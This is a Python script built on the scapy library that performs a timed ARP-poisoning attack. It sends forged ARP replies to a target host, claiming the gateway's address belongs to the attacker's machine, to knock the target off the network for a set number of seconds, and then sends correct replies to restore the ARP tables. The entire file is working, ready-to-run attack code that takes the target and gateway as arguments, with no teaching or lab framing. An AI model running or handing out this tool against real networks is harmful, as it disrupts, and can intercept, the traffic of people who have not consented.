import sys
import time
from scapy.all import Ether, ARP, sendp, conf, get_if_hwaddr, srp

# --- CONFIGURATION (Passed as Arguments) ---
# Arguments are retrieved directly from sys.argv
try:
    TARGET_IP = sys.argv[1]
    TARGET_MAC = sys.argv[2]
    GATEWAY_IP = sys.argv[3]
    GATEWAY_MAC = sys.argv[4]
    DURATION = int(sys.argv[5])
    IFACE = sys.argv[6]
except IndexError:
    print("[FATAL] Missing command-line arguments. Did you call the service correctly?")
    sys.exit(1)

# --- RESTORE FUNCTION ---
def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id):
    """Sends the correct, unpoisoned ARP replies to restore the target's cache."""
    conf.verb = 0
    print(f"\n[!] Restoring ARP Tables for {target_ip}. Ensuring network integrity.")

    # 1. Restore Target's Cache 
    target_restore = ARP(
        op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac
    )

    # 2. Restore Gateway's Cache 
    gateway_restore = ARP(
        op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac
    )

    # Send the real packets multiple times
    sendp(Ether(dst=target_mac) / target_restore, iface=iface_id, count=7, verbose=False)
    sendp(Ether(dst=gateway_mac) / gateway_restore, iface=iface_id, count=7, verbose=False)
    print(f"[+] ARP tables restored for {target_ip}.")

# --- ATTACK FUNCTION (Timed Execution) ---
def spoof_arp_poison_timed(target_ip, target_mac, gateway_ip, gateway_mac, duration, iface_id):
    """
    Executes the poison attack for the specified duration, then cleans up.
    """
    conf.verb = 0
    
    # Create the poison packet (The Lie)
    try:
        # Get the attacker's MAC address from the interface
        attacker_mac = get_if_hwaddr(iface_id)
    except:
        print("[FATAL] Could not get attacker MAC. Interface issue.")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id)
        return

    arp_reply = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_packet = Ether(src=attacker_mac, dst=target_mac) / arp_reply
    
    print(f"[*] Started DoS on {target_ip} for {duration} seconds.")
    end_time = time.time() + duration

    # Continuous loop for the DURATION
    while time.time() < end_time:
        try:
            # sendp sends the Layer 2 packet
            sendp(poison_packet, iface=iface_id, count=5) 
            time.sleep(1)
        except Exception as e:
            print(f"[!!!] Error during attack: {e}. Stopping.")
            break

    # CLEANUP: Crucial step after the duration expires
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id)


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    try:
        print(f"[*] Service received request for {TARGET_IP} (Block Time: {DURATION}s) on interface {IFACE}")
        
        # Start the timed attack
        spoof_arp_poison_timed(TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, DURATION, IFACE)

    except Exception as e:
        print(f"\n[!!!] FATAL EXECUTION ERROR: {e}")
        # Note: No need for sys.exit(1) as the script ends automatically

